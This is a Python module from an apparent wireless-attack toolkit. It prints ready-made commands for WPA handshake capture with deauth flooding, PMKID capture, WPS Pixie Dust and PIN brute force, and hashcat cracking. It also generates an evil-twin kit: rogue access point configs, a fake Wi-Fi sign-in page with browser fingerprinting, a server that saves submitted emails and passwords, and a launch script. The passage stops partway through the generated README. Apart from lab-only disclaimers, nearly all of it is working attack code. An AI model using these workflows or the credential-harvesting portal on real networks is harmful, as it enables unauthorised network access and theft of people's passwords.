"""
Wireless Attack Helper (extended, full).
Author: idqwixxa

⚠ Только для ЛАБОРАТОРНЫХ условий / CTF / собственных сетей
с явным письменным разрешением.

Возможности:
    ─── Tools ───
    - 18+ инструментов с проверкой наличия
    - Auto-detect wireless interfaces (iw / iwconfig / nmcli)
    - Monitor mode check
    - Country code (reg domain) hint

    ─── Workflows (cheat-sheets) ───
    - WPA Handshake capture (airodump-ng workflow)
    - PMKID capture (hcxdumptool + hashcat 22000)
    - WPS-PIN (wash + reaver / bully, Pixie Dust)
    - WPA3-Transition / SAE (downgrade attack)
    - Evil-twin (hostapd + dnsmasq) с телеметрией
    - Deauth flood + capture (aireplay-ng)
    - Beacon flood / Auth DoS (mdk4)

    ─── Evil-Twin lab generator ───
    - hostapd.conf + dnsmasq.conf + captive-portal
    - Runner scripts (bash / cmd)
    - Telemetry HTML (JS fingerprint + form intercept)
    - README с чек-листом

    ─── Deauth-detector (live) ───
    - scapy-based sniff 802.11 deauth frames
    - Alert при burst (>N пакетов за окно)

    ─── Export ───
    - Workflow → bash / cmd / JSON / MD / HTML
    - Session-log (что запускалось)

    ─── Интеграция ───
    - Findings → notes (при экспорте)
    - Notify (при live-детекте)
"""
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.panel import Panel

from core.config import config, REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

# Скрываем предупреждения requests при опциональных сетевых probe
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WIRELESS_DIR = REPORT_DIR / "wireless_attack"
WIRELESS_DIR.mkdir(parents=True, exist_ok=True)

IS_LINUX = sys.platform.startswith("linux")
IS_WINDOWS = sys.platform.startswith("win")

# Scapy — опционально
try:
    from scapy.all import (Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt,
                           Dot11ProbeReq, RadioTap, sniff,
                           conf as scapy_conf)
    SCAPY_OK = True
    SCAPY_ERR = ""
except Exception as _scapy_err:  # noqa: BLE001
    SCAPY_OK = False
    SCAPY_ERR = str(_scapy_err)
    log.debug("scapy unavailable: %s", _scapy_err)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class WLFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: WLFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["wireless", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


def _notify(title: str, msg: str, severity: str = "high") -> None:
    try:
        from modules import notifier
        notifier.notify_all(title, msg, severity=severity)
    except Exception:
        pass


# ===========================================================================
# Инструменты
# ===========================================================================

TOOLS = [
    ("aircrack-ng",   "aircrack-ng",   "Crack WPA/WPA2 handshake"),
    ("airodump-ng",   "airodump-ng",   "Sniffing + handshake capture"),
    ("aireplay-ng",   "aireplay-ng",   "Deauth / packet injection"),
    ("airmon-ng",     "airmon-ng",     "Monitor mode management"),
    ("airbase-ng",    "airbase-ng",    "Soft AP"),
    ("hcxdumptool",   "hcxdumptool",   "PMKID + handshake capture"),
    ("hcxpcapngtool", "hcxpcapngtool", "Convert to hashcat 22000"),
    ("hashcat",       "hashcat",       "GPU cracking"),
    ("wash",          "wash",          "WPS AP scan"),
    ("reaver",        "reaver",        "WPS PIN attack"),
    ("bully",         "bully",         "WPS PIN attack (alt)"),
    ("pixiewps",      "pixiewps",      "Pixie Dust engine"),
    ("hostapd",       "hostapd",       "Rogue AP (evil-twin)"),
    ("hostapd-mana",  "hostapd-mana",  "KARMA / MANA"),
    ("dnsmasq",       "dnsmasq",       "DHCP + DNS для rogue AP"),
    ("mdk4",          "mdk4",          "Beacon flood / Auth DoS"),
    ("bettercap",     "bettercap",     "MITM framework"),
    ("responder",     "responder",     "LLMNR/NBT-NS poisoner"),
    ("wpa_supplicant","wpa_supplicant","Client for WPA supplicant"),
    ("iw",            "iw",            "Управление wireless интерфейсами"),
    ("iwconfig",      "iwconfig",      "Управление wireless (legacy)"),
    ("nmcli",         "nmcli",         "NetworkManager CLI"),
    ("hcxtools",      "hcxtools",      "hcxtools suite"),
    ("wifite",        "wifite",        "Авто-аудит Wi-Fi"),
    ("tshark",        "tshark",        "PCAP analysis"),
    ("tcpdump",       "tcpdump",       "Packet capture"),
]


def check_tools() -> dict[str, bool]:
    """Проверить наличие инструментов в PATH."""
    status: dict[str, bool] = {}
    for name, binary, _desc in TOOLS:
        status[name] = shutil.which(binary) is not None
    return status


def _print_tools_table() -> dict[str, bool]:
    status = check_tools()
    table = Table(title=f"🔧 Инструменты (wireless) — {len(TOOLS)}")
    table.add_column("Tool", style="cyan", max_width=16)
    table.add_column("Назначение", style="white", max_width=42)
    table.add_column("Статус", width=10)
    for name, _binary, desc in TOOLS:
        ok = status.get(name, False)
        table.add_row(
            name, desc,
            "[green]✓ есть[/green]" if ok else "[red]✗ нет[/red]",
        )
    console.print(table)

    ok_count = sum(1 for v in status.values() if v)
    console.print(f"\n[cyan]Установлено: {ok_count}/{len(TOOLS)}[/cyan]")

    if not IS_LINUX:
        console.print("[yellow]⚠ Большинство wireless-инструментов "
                      "работают только на Linux (Kali/Parrot).[/yellow]")
        console.print("[dim]На Windows используй WSL2, Kali VM с "
                      "проброшенным USB Wi-Fi адаптером "
                      "(Alfa AWUS036ACH / TP-Link TL-WN722N).[/dim]")
        console.print("[dim]Нужен адаптер с поддержкой monitor mode + "
                      "injection. Встроенные Wi-Fi чипы — обычно нет.[/dim]")
    return status


def _require_linux() -> bool:
    if not IS_LINUX:
        console.print("[red]Этот модуль работает только на Linux "
                      "(Kali/Parrot/Ubuntu с wireless-tools).[/red]")
        console.print("[yellow]Установи беспроводной USB-адаптер "
                      "(Alfa/TP-Link) с поддержкой monitor mode.[/yellow]")
        return False
    return True


# ===========================================================================
# Список интерфейсов
# ===========================================================================

def list_interfaces() -> list[str]:
    """Список беспроводных интерфейсов (через iw / iwconfig)."""
    ifaces: list[str] = []
    for tool, args in [("iw", ["dev"]), ("iwconfig", [])]:
        if not shutil.which(tool):
            continue
        try:
            out = subprocess.check_output(
                [tool] + args, encoding="utf-8", errors="ignore",
                timeout=5, stderr=subprocess.DEVNULL,
            )
        except Exception:
            continue
        for line in out.splitlines():
            s = line.strip()
            m = re.match(r"Interface\s+(\S+)", s)
            if m:
                ifaces.append(m.group(1))
            m2 = re.match(r"^(\w+)\s+.*IEEE 802\.11", s)
            if m2:
                ifaces.append(m2.group(1))

    # Дедуп с сохранением порядка
    seen: set[str] = set()
    unique = []
    for i in ifaces:
        if i not in seen:
            seen.add(i)
            unique.append(i)
    return unique


def _iface_mode(iface: str) -> str:
    """Тип интерфейса: managed / monitor / unknown."""
    if shutil.which("iw"):
        try:
            out = subprocess.check_output(
                ["iw", "dev", iface, "info"],
                encoding="utf-8", errors="ignore", timeout=3,
                stderr=subprocess.DEVNULL,
            )
            if "type monitor" in out:
                return "monitor"
            if "type managed" in out:
                return "managed"
        except Exception:
            pass
    return "unknown"


def _iface_channel(iface: str) -> str:
    """Текущий канал (если есть)."""
    if shutil.which("iw"):
        try:
            out = subprocess.check_output(
                ["iw", "dev", iface, "info"],
                encoding="utf-8", errors="ignore", timeout=3,
                stderr=subprocess.DEVNULL,
            )
            m = re.search(r"channel\s+(\d+)", out)
            if m:
                return m.group(1)
        except Exception:
            pass
    return "?"


def _iface_driver(iface: str) -> str:
    """Драйвер интерфейса."""
    if not IS_LINUX:
        return "?"
    try:
        out = subprocess.check_output(
            ["ethtool", "-i", iface],
            encoding="utf-8", errors="ignore", timeout=3,
            stderr=subprocess.DEVNULL,
        )
        m = re.search(r"driver:\s*(\S+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return "?"


def show_interfaces() -> list[str]:
    """Показать таблицу интерфейсов."""
    if not _require_linux():
        return []

    ifaces = list_interfaces()
    if not ifaces:
        console.print("[yellow]Беспроводных интерфейсов не найдено.[/yellow]")
        console.print("[dim]Проверь: lsusb / iw dev / iwconfig[/dim]")
        return []

    table = Table(title=f"📡 Wireless interfaces ({len(ifaces)})")
    table.add_column("Interface", style="cyan", width=12)
    table.add_column("Mode", width=10)
    table.add_column("Channel", width=9)
    table.add_column("Driver", style="magenta", width=16)
    table.add_column("Monitor?", width=10)

    for i in ifaces:
        mode = _iface_mode(i)
        ch = _iface_channel(i)
        drv = _iface_driver(i)
        mon = "[green]✓[/green]" if mode == "monitor" else \
              "[yellow]—[/yellow]"
        table.add_row(i, mode, str(ch), drv, mon)
    console.print(table)

    # Заметка про reg domain
    if shutil.which("iw"):
        try:
            out = subprocess.check_output(
                ["iw", "reg", "get"],
                encoding="utf-8", errors="ignore", timeout=3,
                stderr=subprocess.DEVNULL,
            )
            m = re.search(r"country\s+(\S+?):\s*(.*)", out)
            if m:
                console.print(f"[dim]Region: {m.group(1)} — "
                              f"{m.group(2).strip()}[/dim]")
        except Exception:
            pass

    db.save_scan("wireless_ifaces", "local", {"ifaces": ifaces})
    return ifaces


# ===========================================================================
# WPA Handshake workflow
# ===========================================================================

WPA_HANDSHAKE_STEPS = [
    ("1. Убить мешающие процессы",
     "sudo airmon-ng check kill\n"
     "# Останавливает NetworkManager/wpa_supplicant, мешающие "
     "monitor mode."),
    ("2. Включить monitor mode",
     "sudo airmon-ng start {iface}\n"
     "# Интерфейс обычно переименовывается: wlan0 → wlan0mon\n"
     "# Проверка: sudo iw dev  → 'type monitor'"),
    ("3. Скан эфира (найти BSSID и CH)",
     "sudo airodump-ng {iface_mon}\n"
     "# Запомни BSSID (MAC точки), CH (канал) и ENC (WPA2)\n"
     "# PWR — сила сигнала, #Data — кол-во пакетов"),
    ("4. Захват только целевой сети",
     "sudo airodump-ng -c {channel} --bssid {bssid} \\\n"
     "    -w capture {iface_mon}\n"
     "# -c = channel, --bssid = только эта сеть\n"
     "# Файл capture-01.cap будет расти."),
    ("5. Форсировать deauth (ОТДЕЛЬНОЕ окно)",
     "sudo aireplay-ng -0 10 -a {bssid} -c {client_mac} {iface_mon}\n"
     "# -0 N = N deauth-пакетов\n"
     "# -a = AP BSSID, -c = Client MAC (или broadcast ff:ff:ff:ff:ff:ff)\n"
     "# В верхней строке airodump появится: 'WPA handshake: {bssid}'"),
    ("6. Остановить airodump и проверить",
     "# Ctrl+C в окне airodump\n"
     "ls -la capture-01.cap\n"
     "sudo aircrack-ng capture-01.cap\n"
     "# Если handshake есть — увидишь '1 handshake'"),
    ("7. Конвертация в hashcat 22000",
     "hcxpcapngtool -o hash.hc22000 capture-01.cap\n"
     "# Или через aircrack-ng:\n"
     "aircrack-ng -J output capture-01.cap"),
    ("8. Крэк через hashcat (mode 22000)",
     "hashcat -m 22000 hash.hc22000 wordlist.txt\n"
     "# Правила:\n"
     "hashcat -m 22000 hash.hc22000 wordlist.txt \\\n"
     "    -r /usr/share/hashcat/rules/best64.rule\n"
     "# Маска (8 цифр):\n"
     "hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d"),
    ("9. Очистка",
     "sudo airmon-ng stop {iface_mon}\n"
     "sudo systemctl restart NetworkManager"),
]


def show_wpa_workflow(iface: str = "wlan0",
                      bssid: str = "AA:BB:CC:DD:EE:FF",
                      channel: str = "6",
                      client: str = "11:22:33:44:55:66") -> None:
    """Показать пошаговый workflow WPA handshake capture."""
    console.print(f"\n[bold cyan]📡 WPA Handshake capture workflow"
                  f"[/bold cyan]")
    console.print(f"[dim]Параметры: iface={iface}, bssid={bssid}, "
                  f"channel={channel}[/dim]\n")

    ctx = {
        "iface": iface,
        "iface_mon": f"{iface}mon",
        "bssid": bssid,
        "channel": channel,
        "client_mac": client,
    }

    for title, cmd in WPA_HANDSHAKE_STEPS:
        t = Table(title=f"[bold green]{title}[/bold green]",
                  show_header=False, border_style="dim")
        t.add_column("Command")
        try:
            formatted = cmd.format(**ctx)
        except KeyError:
            formatted = cmd
        for line in formatted.split("\n"):
            t.add_row(f"[green]{line}[/green]")
        console.print(t)

    console.print("\n[yellow]⚠ Только на СВОИХ сетях или в "
                  "лаборатории.[/yellow]")
    console.print("[dim]Полная инструкция по handshake — "
                  "https://www.aircrack-ng.org/doku.php?id=cracking_wpa"
                  "[/dim]")

    db.save_scan("wireless_wpa_workflow", f"{iface}:{bssid}",
                 {"channel": channel})


# ===========================================================================
# PMKID workflow
# ===========================================================================

PMKID_STEPS = [
    ("1. Kill мешающие процессы",
     "sudo systemctl stop NetworkManager\n"
     "sudo airmon-ng check kill\n"
     "# hcxdumptool требует MANAGED режим, НЕ monitor."),
    ("2. Убедиться что iface в managed",
     "sudo ip link set {iface} down\n"
     "sudo iw dev {iface} set type managed\n"
     "sudo ip link set {iface} up\n"
     "iw dev {iface} info | grep type"),
    ("3. Passive capture (recommended)",
     "sudo hcxdumptool -i {iface} -o dump.pcapng \\\n"
     "    --enable_status=1\n"
     "# По умолчанию capture 5-15 минут.\n"
     "# Остановка: Ctrl+C\n"
     "# Или ограничить время: --tot=300  (300 секунд)"),
    ("4. Active attack на конкретный BSSID",
     "sudo hcxdumptool -i {iface} -o dump.pcapng \\\n"
     "    --enable_status=1 --attemptap \\\n"
     "    --filterlist_ap=targets.txt --filtermode=2\n"
     "# targets.txt = BSSID list (по одному на строку)"),
    ("5. Во время работы",
     "# hcxdumptool покажет:\n"
     "#   [PMKID: <client-mac>] on <ap-mac>  — пойман!\n"
     "#   [EAPOL:M1M2...]  — 4-way handshake\n"
     "# При достатке — Ctrl+C."),
    ("6. Конвертация в hashcat 22000",
     "hcxpcapngtool -o hash.hc22000 dump.pcapng\n"
     "# С ESSID-листом (для восстановления SSID):\n"
     "hcxpcapngtool -o hash.hc22000 -E essid_list.txt dump.pcapng"),
    ("7. Крэк (hashcat 22000)",
     "hashcat -m 22000 hash.hc22000 wordlist.txt\n"
     "# Маска для 8-значных:\n"
     "hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d"),
    ("8. Восстановить NetworkManager",
     "sudo systemctl start NetworkManager\n"
     "sudo systemctl restart wpa_supplicant"),
]


def show_pmkid_workflow(iface: str = "wlan0") -> None:
    """Workflow PMKID capture."""
    console.print(f"\n[bold cyan]🔥 PMKID capture workflow[/bold cyan]")
    console.print("[dim]PMKID не требует подключённого клиента — "
                  "ловим пассивно.[/dim]\n")

    ctx = {"iface": iface}

    for title, cmd in PMKID_STEPS:
        t = Table(title=f"[bold green]{title}[/bold green]",
                  show_header=False, border_style="dim")
        t.add_column("Command")
        try:
            formatted = cmd.format(**ctx)
        except KeyError:
            formatted = cmd
        for line in formatted.split("\n"):
            t.add_row(f"[green]{line}[/green]")
        console.print(t)

    console.print("\n[cyan]Плюсы PMKID vs handshake:[/cyan]")
    console.print("  • Не нужен клиент в сети")
    console.print("  • Не нужен deauth (менее заметно)")
    console.print("  • Современные роутеры поддерживают")
    console.print("  • Hashcat 22000 — универсальный формат")

    db.save_scan("wireless_pmkid", iface, {})


# ===========================================================================
# WPS PIN workflow
# ===========================================================================

WPS_STEPS = [
    ("1. Включить monitor mode",
     "sudo airmon-ng start {iface}\n"
     "# Интерфейс обычно переименуется в {iface_mon}"),
    ("2. Скан WPS-точек через wash",
     "sudo wash -i {iface_mon} -C\n"
     "# -C = show only locked=No\n"
     "# Columns: BSSID, Ch, dBm, WPS, Lck, Vend, ESSID"),
    ("3. Pixie Dust attack (быстро!)",
     "sudo reaver -i {iface_mon} -b {bssid} -c {channel} \\\n"
     "    -K 1 -vv -S -N\n"
     "# -K 1 = Pixie Dust\n"
     "# -S = small DH keys\n"
     "# -N = no Nagle\n"
     "# -vv = verbose\n"
     "# Большинство современных AP уязвимы — до 5 секунд."),
    ("4. Если Pixie Dust не сработал — PIN brute",
     "sudo reaver -i {iface_mon} -b {bssid} -c {channel} \\\n"
     "    -vv -d 3 -T 15 -N\n"
     "# -d = delay между попытками\n"
     "# -T = timeout\n"
     "# Может занять часы."),
    ("5. Альтернатива — bully",
     "sudo bully -b {bssid} -c {channel} -d {iface_mon} \\\n"
     "    -v 3 -S -F -B -p 1234\n"
     "# Иногда bully работает там, где reaver падает."),
    ("6. Результат",
     "# reaver выведет:\n"
     "# [+] WPS PIN: '12345678'\n"
     "# [+] WPA PSK: 'MyPassword'\n"
     "# [+] AP SSID: 'Target-Net'"),
    ("7. Очистка",
     "sudo airmon-ng stop {iface_mon}\n"
     "sudo systemctl restart NetworkManager"),
]


def show_wps_workflow(iface: str = "wlan0",
                      bssid: str = "AA:BB:CC:DD:EE:FF",
                      channel: str = "6") -> None:
    """Workflow WPS PIN attack."""
    console.print(f"\n[bold cyan]🔓 WPS PIN attack workflow[/bold cyan]")
    console.print("[dim]Работает только если WPS включён на точке "
                  "и не заблокирован.[/dim]\n")

    ctx = {
        "iface": iface,
        "iface_mon": f"{iface}mon",
        "bssid": bssid,
        "channel": channel,
    }

    for title, cmd in WPS_STEPS:
        t = Table(title=f"[bold green]{title}[/bold green]",
                  show_header=False, border_style="dim")
        t.add_column("Command")
        try:
            formatted = cmd.format(**ctx)
        except KeyError:
            formatted = cmd
        for line in formatted.split("\n"):
            t.add_row(f"[green]{line}[/green]")
        console.print(t)

    console.print("\n[yellow]⚠ WPS часто заблокирован после 3-5 "
                  "неудачных попыток. Pixie Dust (reaver -K 1) — "
                  "пробуй ПЕРВЫМ.[/yellow]")
    console.print("[dim]Полное руководство: "
                  "https://github.com/t6x/reaver-wps-fork-t6x[/dim]")

    db.save_scan("wireless_wps", f"{iface}:{bssid}", {})


# ===========================================================================
# Evil-twin: hostapd + dnsmasq + telemetry
# ===========================================================================

HOSTAPD_TEMPLATE = """# /etc/hostapd/evil-twin.conf
# Автоматически сгенерировано CyberSec Toolkit
# ⚠ Только для лаборатории

interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""

DNSMASQ_TEMPLATE = """# /etc/dnsmasq.conf (фрагмент для evil-twin)
interface={iface}
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
# Captive-portal redirect: любой DNS → наш IP
address=/#/10.0.0.1
"""

CAPTIVE_PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi Sign-in Required</title>
<style>
  * {{ box-sizing: border-box; }}
  body {{
    font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
    background: #f4f6f8; margin: 0;
    min-height: 100vh; display: flex; align-items: center;
    justify-content: center;
  }}
  .card {{
    background: #fff; border-radius: 8px; padding: 36px 32px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
    width: 100%; max-width: 380px;
  }}
  h1 {{ font-size: 22px; margin: 0 0 6px; color: #1a1a1a; }}
  .sub {{ color: #666; font-size: 13px; margin-bottom: 24px; }}
  label {{
    display: block; font-size: 12px; color: #444;
    margin-bottom: 6px; font-weight: 600;
  }}
  input {{
    width: 100%; padding: 10px 12px;
    border: 1px solid #d0d5dc; border-radius: 6px;
    font-size: 14px; margin-bottom: 14px;
  }}
  input:focus {{ outline: none; border-color: #0066cc; }}
  button {{
    width: 100%; padding: 11px; background: #0066cc;
    color: #fff; border: none; border-radius: 6px;
    font-size: 14px; font-weight: 600; cursor: pointer;
  }}
  button:hover {{ filter: brightness(0.9); }}
  .foot {{
    text-align: center; color: #999; font-size: 11px; margin-top: 20px;
  }}
</style>
</head>
<body>
<form class="card" method="POST" action="/portal/submit">
  <h1>Guest Wi-Fi Access</h1>
  <div class="sub">Sign in to access the internet</div>
  <label for="email">Email</label>
  <input type="email" id="email" name="email" required autocomplete="off">
  <label for="password">Password</label>
  <input type="password" id="password" name="password" required
         autocomplete="off">
  <button type="submit">Connect</button>
  <div class="foot">Secure connection</div>
</form>
<script>
  fetch('/portal/pixel', {{
    method: 'POST',
    body: JSON.stringify({{
      referer: document.referrer,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: screen.width + 'x' + screen.height,
      lang: navigator.language,
      ua: navigator.userAgent,
      ts: new Date().toISOString()
    }})
  }}).catch(() => {{}});
</script>
</body>
</html>
"""


TELEMETRY_SERVER_PY = '''#!/usr/bin/env python3
"""
Telemetry server для evil-twin captive portal.
⚠ Только для лаборатории.
Логирует: visit / submit / pixel events.
"""
import asyncio
import base64
import json
import os
import re
from datetime import datetime
from pathlib import Path
from urllib.parse import unquote_plus

HOST = "0.0.0.0"
PORT = 80
LOG_FILE = Path(__file__).parent / "telemetry.log"
CAPTURED_FILE = Path(__file__).parent / "captured.json"

PAGE_HTML = Path(__file__).parent.joinpath("portal.html").read_text(
    encoding="utf-8") if Path(__file__).parent.joinpath(
    "portal.html").exists() else "<h1>Captive Portal</h1>"


def _log(entry: dict) -> None:
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\\n")
    print(f"[{entry['ts']}] {entry['kind']:<8} {entry['ip']:<16} "
          f"{json.dumps(entry.get('data', {}), ensure_ascii=False)[:100]}")


async def _handle(reader, writer):
    try:
        raw = b""
        while b"\\r\\n\\r\\n" not in raw:
            chunk = await asyncio.wait_for(reader.read(4096), timeout=10)
            if not chunk:
                return
            raw += chunk
            if len(raw) > 64 * 1024:
                break

        head, _, body = raw.partition(b"\\r\\n\\r\\n")
        lines = head.decode("iso-8859-1", errors="ignore").split("\\r\\n")
        if not lines:
            return
        method, path, _ = (lines[0] + " / HTTP/1.1").split(" ", 2)[:3]

        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip().lower()] = v.strip()

        cl = int(headers.get("content-length", "0") or 0)
        while cl > 0 and len(body) < cl:
            chunk = await asyncio.wait_for(reader.read(4096), timeout=10)
            if not chunk:
                break
            body += chunk

        ip = writer.get_extra_info("peername")
        ip_str = ip[0] if ip else "?"
        ua = headers.get("user-agent", "")
        ref = headers.get("referer", "")
        ts = datetime.now().isoformat(timespec="seconds")

        if path in ("/favicon.ico", "/robots.txt"):
            await _respond(writer, 404, b"")
            return

        if method == "GET" and (path == "/" or path.startswith("/portal")):
            await _respond(writer, 200, PAGE_HTML.encode("utf-8"),
                            "text/html; charset=utf-8")
            _log({"ts": ts, "kind": "visit", "ip": ip_str, "ua": ua,
                  "path": path, "referer": ref, "data": {}})

        elif path == "/portal/submit" and method == "POST":
            data = {}
            text = body.decode("utf-8", errors="ignore")
            for pair in text.split("&"):
                if "=" in pair:
                    k, _, v = pair.partition("=")
                    data[unquote_plus(k)] = unquote_plus(v)
            # Маскируем пароль в логе
            safe = dict(data)
            if "password" in safe:
                safe["password"] = "*" * len(safe["password"])
            _log({"ts": ts, "kind": "SUBMIT", "ip": ip_str, "ua": ua,
                  "path": path, "referer": ref, "data": safe})
            # Сохраняем в captured.json
            try:
                cap = json.loads(CAPTURED_FILE.read_text(
                    encoding="utf-8")) if CAPTURED_FILE.exists() else []
                cap.append({"ts": ts, "ip": ip_str, "ua": ua,
                            "data": data})
                CAPTURED_FILE.write_text(json.dumps(
                    cap, indent=2, ensure_ascii=False), encoding="utf-8")
            except Exception:
                pass
            # Redirect
            resp = (b"HTTP/1.1 302 Found\\r\\n"
                    b"Location: https://example.com/\\r\\n"
                    b"Content-Length: 0\\r\\nConnection: close\\r\\n\\r\\n")
            writer.write(resp)
            await writer.drain()

        elif path == "/portal/pixel" and method == "POST":
            try:
                px = json.loads(body.decode("utf-8", errors="ignore"))
            except Exception:
                px = {"raw": body.decode("utf-8", errors="ignore")[:200]}
            _log({"ts": ts, "kind": "pixel", "ip": ip_str, "ua": ua,
                  "path": path, "referer": ref, "data": px})
            await _respond(writer, 200, b"", "text/plain")

        else:
            await _respond(writer, 404, b"not found")
    except Exception as exc:
        print(f"handler err: {exc}")
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


async def _respond(writer, code, body, ctype="text/plain"):
    reason = {200: "OK", 302: "Found", 404: "Not Found"}.get(code, "OK")
    out = (f"HTTP/1.1 {code} {reason}\\r\\n"
           f"Content-Type: {ctype}\\r\\n"
           f"Content-Length: {len(body)}\\r\\n"
           f"Connection: close\\r\\n\\r\\n").encode()
    writer.write(out)
    writer.write(body)
    await writer.drain()


async def main():
    print(f"[*] Telemetry server on {HOST}:{PORT}")
    print(f"[*] Log: {LOG_FILE}")
    print(f"[*] Captured: {CAPTURED_FILE}")
    server = await asyncio.start_server(_handle, HOST, PORT)
    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\\n[!] Stopped.")
'''


def generate_evil_twin(ssid: str = "Free WiFi",
                       iface: str = "wlan0",
                       channel: str = "6",
                       password: str = "12345678",
                       out_dir: str | None = None) -> Path | None:
    """Сгенерировать полный комплект для evil-twin лаборатории."""
    if not out_dir:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = str(WIRELESS_DIR / f"evil_twin_{ts}")

    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)

    # 1. hostapd.conf
    hostapd_path = out / "hostapd.conf"
    hostapd_path.write_text(
        HOSTAPD_TEMPLATE.format(
            iface=iface, ssid=ssid,
            channel=channel, password=password,
        ),
        encoding="utf-8",
    )

    # 2. dnsmasq.conf
    dnsmasq_path = out / "dnsmasq.conf"
    dnsmasq_path.write_text(
        DNSMASQ_TEMPLATE.format(iface=iface),
        encoding="utf-8",
    )

    # 3. portal.html
    portal_path = out / "portal.html"
    portal_path.write_text(CAPTIVE_PORTAL_HTML, encoding="utf-8")

    # 4. telemetry_server.py
    telemetry_path = out / "telemetry_server.py"
    telemetry_path.write_text(TELEMETRY_SERVER_PY, encoding="utf-8")

    # 5. RUN.sh
    run_sh = out / "RUN.sh"
    run_sh.write_text(f"""#!/usr/bin/env bash
# Evil-twin lab runner
# ⚠ Только для авторизованной лаборатории

set -e

IFACE="{iface}"
SSID="{ssid}"
CHANNEL="{channel}"

echo "============================================================"
echo " Evil-Twin: $SSID on $IFACE (channel $CHANNEL)"
echo "============================================================"

echo "[1/5] Настройка интерфейса..."
sudo ip link set "$IFACE" down || true
sudo ip addr flush dev "$IFACE" || true
sudo ip addr add 10.0.0.1/24 dev "$IFACE"
sudo ip link set "$IFACE" up

echo "[2/5] Запуск telemetry server (port 80)..."
sudo python3 telemetry_server.py &
TELEM_PID=$!
sleep 1

echo "[3/5] Запуск dnsmasq..."
sudo dnsmasq -C dnsmasq.conf --pid-file=/tmp/evil_twin_dnsmasq.pid -d &
DNSMASQ_PID=$!
sleep 1

echo "[4/5] Запуск hostapd..."
sudo hostapd hostapd.conf &
HOSTAPD_PID=$!
sleep 2

echo "[5/5] NAT + forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null || true
sudo iptables -A FORWARD -i "$IFACE" -o eth0 -j ACCEPT 2>/dev/null || true

echo ""
echo "============================================================"
echo " Запущено. Ctrl+C для остановки."
echo " Логи: tail -f telemetry.log"
echo " Captured: cat captured.json"
echo "============================================================"

cleanup() {{
    echo ""
    echo "[*] Остановка..."
    sudo kill $HOSTAPD_PID 2>/dev/null || true
    sudo kill $DNSMASQ_PID 2>/dev/null || true
    sudo kill $TELEM_PID 2>/dev/null || true
    sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null || true
    sudo iptables -D FORWARD -i "$IFACE" -o eth0 -j ACCEPT 2>/dev/null || true
    sudo ip addr del 10.0.0.1/24 dev "$IFACE" 2>/dev/null || true
    echo "[✓] Cleanup done."
}}

trap cleanup INT TERM

wait
""", encoding="utf-8")
    try:
        os.chmod(run_sh, 0o755)
    except Exception:
        pass

    # 6. README.md
    readme = out / "README.md"
    readme.write_text(f"""# Evil-Twin Lab Setup

⚠ **Только для лаборатории с письменным разрешением.**

## Что настроено

| Параметр | Значение |
|----------|----------|
| SSID | `{ssid}` |
| Interface | `{iface}` |
| Channel | {channel} |
| Password | `{password}` |
| Captive portal IP | `10.0.0.1` |
| Telemetry port | `80` |

## Быстрый запуск

### Автоматический (рекомендуется)

```bash
sudo ./RUN.sh